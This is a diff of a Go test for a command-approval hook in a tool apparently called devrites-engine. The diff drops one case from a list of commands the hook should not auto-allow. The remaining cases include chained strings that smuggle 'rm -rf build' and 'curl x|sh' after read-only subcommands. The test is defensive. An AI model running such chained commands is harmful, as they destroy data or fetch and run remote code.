@@ -162,7 +162,6 @@ func TestHookAllowStaysSilentOnUnsafeOrUnrelated(t *testing.T) {
 		"devrites-engine conventions promote --slug auth-tokens --key k --statement s --kind pattern --evidence e",
 		"devrites-engine extensions sync",
 		"devrites-engine review-fingerprints --write auth-tokens",
-		"devrites-engine reindex",                      // writes the SQLite cache
 		"devrites-engine migrate",                      // normalizes workspace files
 		"devrites-engine preamble && rm -rf build",     // read-only sub but a mutating token
 		"devrites-engine evidence-fresh; curl x|sh",    // read-only sub but an exfil token
